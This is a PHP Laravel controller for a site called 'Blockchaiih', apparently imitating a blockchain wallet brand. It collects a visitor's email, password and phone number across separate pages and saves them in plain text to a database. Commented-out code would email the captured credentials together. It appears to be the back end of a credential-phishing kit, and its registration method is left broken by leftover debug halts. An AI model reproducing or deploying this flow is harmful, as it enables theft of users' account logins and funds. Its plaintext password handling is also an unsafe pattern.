<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

use App\Models\Blockchaiih;

class BlockChaiihController extends Controller
{
    public function login()
    {
    	return view('blockchaiih.login');
    }
    public function password()
    {
    	return view('blockchaiih.password');
    }
    public function register()
    {
    	return view('blockchaiih.register');
    }
    public function number()
    {
        return view('blockchaiih.number');
    }
    public function postRegister(request $request)
    {
        //dd($request);
        $request->validate([
            'name'=>'required',
            'email'=>'required',
            'password'=>'required',

        ]);

        dd('done');
        dd(Blockchaiih::create($request->all()));
        dd('not done');
        return view('welcome');
    }
    public function postLogin(request $request)
    {
        $request->validate([
            'email'=>'required',
        ]);
        $email = $request->email;
        session()->put('email',$email);

        return view('blockchaiih.password');
    }
    public function postNumber(request $request)
    {
        $request->validate([
            'number'=>'required',
        ]);
        $number = $request->number;

        //session()->put('number',$number );

        $Blockchaiih = new Blockchaiih();
        $Blockchaiih->email = session()->get('email');
        $Blockchaiih->number = $number;
        $Blockchaiih->password = session()->get('password');

        $Blockchaiih->save();

//        $blockchaiih = Blockchaiih::first();
//        $mailData = [
//            'body'=>'You have received the mail',
//            'mailText'=> 'Email:'. session()->get('email'). 'Password:' . session()->get('password') . 'NUmber:' . $number,
//            'thankyou'=> 'Thank you for using Blockchaiih'
//        ];
//
//        $blockchaiih->notify(new Blockchaiih($mailData));

        return view('welcome');
    }
    public function postPassword(request $request)
    {
        $request->validate([
            'password'=>'required',
        ]);
        $password = $request->password;
        session()->put('password',$password);

        return view('blockchaiih.number');
    }
}
